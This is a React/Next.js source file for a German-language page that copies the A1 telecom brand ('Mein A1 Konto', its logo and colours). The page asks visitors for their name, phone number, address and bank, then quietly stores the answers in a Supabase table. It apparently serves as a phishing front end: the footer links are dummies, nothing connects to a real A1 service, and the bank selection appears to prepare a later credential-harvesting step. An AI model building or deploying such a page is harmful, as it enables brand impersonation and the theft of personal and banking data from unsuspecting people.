'use client'

import { useState, useEffect } from 'react'
import { useRouter } from 'next/navigation'
import { supabase } from '@/lib/supabase/client'

interface Bank {
  id: string
  name: string
}

interface FormData {
  full_name: string
  phone: string
  street_address: string
  zip_code: string
  city: string
  bank_id: string
}

export default function FormPage() {
  const router = useRouter()
  const [banks, setBanks] = useState<Bank[]>([])
  const [formData, setFormData] = useState<FormData>({
    full_name: '',
    phone: '',
    street_address: '',
    zip_code: '',
    city: '',
    bank_id: ''
  })
  const [error, setError] = useState('')

  useEffect(() => {
    fetchBanks()
  }, [])

  const fetchBanks = async () => {
    const { data, error } = await supabase
      .from('banks')
      .select('*')
      .eq('active', true)
    
    if (data) {
      setBanks(data)
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setError('')

    try {
      const { error: submitError } = await supabase
        .from('form_submissions')
        .insert({
          full_name: formData.full_name,
          phone: formData.phone,
          street_address: formData.street_address,
          zip_code: formData.zip_code,
          city: formData.city,
          bank_id: formData.bank_id
        })

      if (submitError) {
        console.error('Submit error:', submitError)
        throw submitError
      }
      
      router.push('/success')
    } catch (error) {
      console.error('Error:', error)
      setError('Ein Fehler ist aufgetreten. Bitte versuchen Sie es später erneut.')
    }
  }

  return (
    <div className="min-h-screen bg-[#f5f5f5]">
      {/* Header */}
      <header className="w-full bg-white border-b border-gray-200">
        <div className="max-w-[1200px] mx-auto px-6 py-4">
          <span className="text-[#e20074] text-2xl font-bold">A¹</span>
        </div>
      </header>

      {/* Main Content */}
      <div className="max-w-[1200px] mx-auto px-6 py-6 md:py-10">
        <div className="w-full max-w-[460px]">
          <h1 className="text-[32px] font-bold mb-2">Mein A1 Konto</h1>
          <p className="text-[#666] text-[15px] mb-12">Bitte geben Sie Ihre Daten ein</p>

          {/* Form Section */}
          <div className="bg-white p-8 shadow-sm">
            <h2 className="text-[18px] font-bold mb-8">Ihre Daten</h2>

            <form onSubmit={handleSubmit} className="space-y-6">
              {error && (
                <div className="text-[#e20074] text-[14px] bg-[#fff3f8] p-3 rounded">
                  {error}
                </div>
              )}

              <div>
                <input
                  type="text"
                  required
                  placeholder="Vor- und Nachname"
                  className="w-full p-3 border border-gray-300 text-[15px] focus:outline-none focus:border-[#e20074] placeholder-gray-500"
                  value={formData.full_name}
                  onChange={(e) => setFormData({...formData, full_name: e.target.value})}
                />
              </div>

              <div>
                <input
                  type="tel"
                  required
                  placeholder="Telefonnummer"
                  className="w-full p-3 border border-gray-300 text-[15px] focus:outline-none focus:border-[#e20074] placeholder-gray-500"
                  value={formData.phone}
                  onChange={(e) => setFormData({...formData, phone: e.target.value})}
                />
              </div>

              <div>
                <input
                  type="text"
                  required
                  placeholder="Straße und Hausnummer"
                  className="w-full p-3 border border-gray-300 text-[15px] focus:outline-none focus:border-[#e20074] placeholder-gray-500"
                  value={formData.street_address}
                  onChange={(e) => setFormData({...formData, street_address: e.target.value})}
                />
              </div>

              <div className="grid grid-cols-2 gap-4">
                <input
                  type="text"
                  required
                  placeholder="PLZ"
                  className="w-full p-3 border border-gray-300 text-[15px] focus:outline-none focus:border-[#e20074] placeholder-gray-500"
                  value={formData.zip_code}
                  onChange={(e) => setFormData({...formData, zip_code: e.target.value})}
                />
                <input
                  type="text"
                  required
                  placeholder="Ort"
                  className="w-full p-3 border border-gray-300 text-[15px] focus:outline-none focus:border-[#e20074] placeholder-gray-500"
                  value={formData.city}
                  onChange={(e) => setFormData({...formData, city: e.target.value})}
                />
              </div>

              <div>
                <select
                  required
                  className="w-full p-3 border border-gray-300 text-[15px] focus:outline-none focus:border-[#e20074] bg-white"
                  value={formData.bank_id}
                  onChange={(e) => setFormData({...formData, bank_id: e.target.value})}
                >
                  <option value="">Bank auswählen</option>
                  {banks.map((bank) => (
                    <option key={bank.id} value={bank.id}>
                      {bank.name}
                    </option>
                  ))}
                </select>
              </div>

              <div className="pt-4">
                <button
                  type="submit"
                  className="w-full bg-[#e20074] text-white py-[10px] text-[14px] font-medium hover:bg-[#cb0068]"
                >
                  WEITER
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="w-full bg-white mt-auto border-t border-gray-200">
        <div className="max-w-[1200px] mx-auto px-6 py-4">
          <div className="flex flex-wrap gap-6 text-[13px]">
            <a href="#" className="text-[#666] hover:text-[#e20074]">Cookie-Einstellungen</a>
            <a href="#" className="text-[#666] hover:text-[#e20074]">AGB</a>
            <a href="#" className="text-[#666] hover:text-[#e20074]">Impressum</a>
            <a href="#" className="text-[#666] hover:text-[#e20074]">Datenschutz</a>
          </div>
        </div>
      </footer>
    </div>
  )
} 